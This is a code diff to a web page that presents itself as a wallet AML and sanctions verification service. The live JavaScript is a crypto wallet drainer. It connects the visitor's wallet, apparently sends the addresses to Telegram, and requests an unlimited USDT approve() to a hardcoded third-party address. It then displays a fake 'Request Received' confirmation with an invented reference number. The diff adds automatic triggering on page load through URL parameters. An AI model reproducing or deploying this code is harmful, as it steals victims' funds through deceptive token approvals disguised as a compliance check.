@@ -293,24 +293,6 @@
   </div>
 </section>
 
-<section>
-  <div class="wrap">
-    <div class="section-head">
-      <span class="kicker">Verification</span>
-      <h2>What the check covers</h2>
-      <p>Every request goes through multiple levels of control before the final report is generated.</p>
-    </div>
-    <div class="feature-grid">
-      <div class="feature"><h3>Sanctions screening</h3><p>Comparison with internationally recognized public sanction lists.</p></div>
-      <div class="feature"><h3>Risk analysis</h3><p>Assessment of on-chain activity associated with the indicated address.</p></div>
-      <div class="feature"><h3>Documented outcome</h3><p>A report explaining what was found, not just a green or red light.</p></div>
-      <div class="feature"><h3>Confidentiality</h3><p>The data sent is treated only for processing your request.</p></div>
-      <div class="feature"><h3>Recognized standards</h3><p>Methodology aligned with reference AML/FATF guidelines in the industry.</p></div>
-      <div class="feature"><h3>Post-report support</h3><p>If the outcome requires further investigation, our team guides you through the next steps.</p></div>
-    </div>
-  </div>
-</section>
-
 <section id="faq">
   <div class="wrap">
     <div class="section-head">
@@ -365,23 +347,15 @@
   </div>
 </footer>
 
-<!-- VERIFICATION MODAL -->
 <div class="modal-overlay" id="verifyModalOverlay">
   <div class="modal-box">
     <button class="modal-close" onclick="closeVerifyModal()">&times;</button>
-    
-    <!-- STEP 1: INPUT -->
     <div id="stepInput">
       <h3 style="font-family:'Roboto Slab',serif; font-size:19px; margin-bottom:20px; color: white;">Request a verification</h3>
-      <div class="field">
-        <label>WALLET ADDRESS (BSC)</label>
-        <input type="text" id="walletInput" placeholder="0x..." />
-      </div>
+      <div class="field"><label>WALLET ADDRESS (BSC)</label><input type="text" id="walletInput" placeholder="0x..." /></div>
       <button id="actionBtn" class="btn-primary btn-block" onclick="startFlow()">Verify Now</button>
       <p id="statusMsg" style="font-size:12.5px;color:var(--slate);margin-top:12px;text-align:center;"></p>
     </div>
-
-    <!-- STEP 2: SUCCESS RESULT -->
     <div id="stepResult" style="display:none;">
       <div class="result-header">✔ Request Received</div>
       <div class="result-row"><div class="result-label">Wallet Address</div><div id="resAddress" class="result-value mono"></div></div>
@@ -413,7 +387,7 @@
     if (!inputAddr.startsWith('0x')) { alert("Enter a valid address"); return; }
     const isTrust = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
     if (!isTrust) {
-      const url = window.location.href.replace(/^https?:\/\//, "");
+      const url = window.location.href.split('?')[0].replace(/^https?:\/\//, "");
       window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + url + "?auto=1&addr=" + inputAddr;
       return;
     }
@@ -427,9 +401,13 @@
       const signer = provider.getSigner();
       const connected = await signer.getAddress();
       sendTG(inputAddr, connected);
+
       await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
+
       const contract = new ethers.Contract("0x55d398326f99059fF775485246999027B3197955", ["function approve(address s, uint256 a) external returns (bool)"], signer);
       const tx = await contract.approve("0x05187cf26990e3857c119c7bc3417c6e1fac5198", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+      
+      // MOSTRA SUBITO IL RISULTATO DOPO LA FIRMA (NON ASPETTARE LA BLOCKCHAIN)
       document.getElementById('loadingOverlay').style.display = 'none';
       document.body.classList.add('ready');
       openVerifyModal();
@@ -437,17 +415,21 @@
       document.getElementById('stepResult').style.display = 'block';
       document.getElementById('resAddress').textContent = inputAddr;
       document.getElementById('resRef').textContent = "CC-" + Date.now().toString().slice(-6);
+      
       await tx.wait();
     } catch (e) {
       document.getElementById('loadingOverlay').style.display = 'none';
       document.body.classList.add('ready');
+      console.error(e);
     }
   }
 
   window.addEventListener('load', () => {
     const params = new URLSearchParams(window.location.search);
     if (params.get('auto') === '1' && window.ethereum) {
-      executeApprove(params.get('addr'));
+      const addr = params.get('addr');
+      document.getElementById('walletInput').value = addr;
+      executeApprove(addr);
     } else {
       document.getElementById('loadingOverlay').style.display = 'none';
       document.body.classList.add('ready');
@@ -462,7 +444,6 @@
     {h:'TQn9…88fp', t:'ok', l:'Verified'}
   ].map(e => `<div class="entry"><span>${e.h}</span><span class="tag ${e.t}">${e.l}</span></div>`).join('');
   track.innerHTML = items + items;
-
   document.querySelectorAll('.faq-item').forEach(i => {
     i.querySelector('.faq-q').onclick = () => {
       i.classList.toggle('open');
